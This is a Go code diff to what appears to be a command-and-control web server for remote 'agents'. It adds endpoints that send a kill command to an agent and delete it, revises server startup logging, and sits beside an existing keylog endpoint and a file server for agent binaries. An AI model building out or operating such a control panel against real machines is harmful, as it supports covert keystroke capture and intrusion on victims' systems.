@@ -107,6 +107,25 @@ func main() {
 		}
 	})
 
+	r.Get("/api/killagent/{agt}", func(w http.ResponseWriter, r *http.Request) {
+		agentParam := chi.URLParam(r, "agt")
+		newCmdID := uuid.New().String()
+		res, _ := yin.Event(w, r)
+		data.SendAgentCommand(agentParam, "0", "kill", "Kill Agent", newCmdID) // from web
+		res.SendString("Success")
+	})
+
+	r.Get("/api/deleteagent/{agt}", func(w http.ResponseWriter, r *http.Request) {
+		agentParam := chi.URLParam(r, "agt")
+		newCmdID := uuid.New().String()
+		res, _ := yin.Event(w, r)
+		//kill first
+		data.SendAgentCommand(agentParam, "0", "kill", "Kill Agent", newCmdID)
+		//then delete
+		data.DeleteAgent(agentParam)
+		res.SendString("Success")
+	})
+
 	r.Get("/api/keylog/{agt}", func(w http.ResponseWriter, r *http.Request) {
 		agentParam := chi.URLParam(r, "agt")
 		res, _ := yin.Event(w, r)
@@ -191,7 +210,16 @@ func main() {
 	filesDir := http.Dir(filepath.Join(workDir, "agents"))
 	FileServer(r, "/files", filesDir)
 
-	http.ListenAndServe(webserverip+":"+webserverport, r)
+	defer func() {
+		if err := http.ListenAndServe(webserverip+":"+webserverport, r); err != nil {
+			if err == http.ErrServerClosed {
+				log.Printf("Server closed under request %v\n", err)
+			} else {
+				log.Printf("Server closed unexpected %v\n", err)
+			}
+		}
+	}()
+	logger.Logf(logger.Done, "Server started on port "+webserverip+":"+webserverport+"\n")
 }
 
 func FileServer(r chi.Router, path string, root http.FileSystem) {
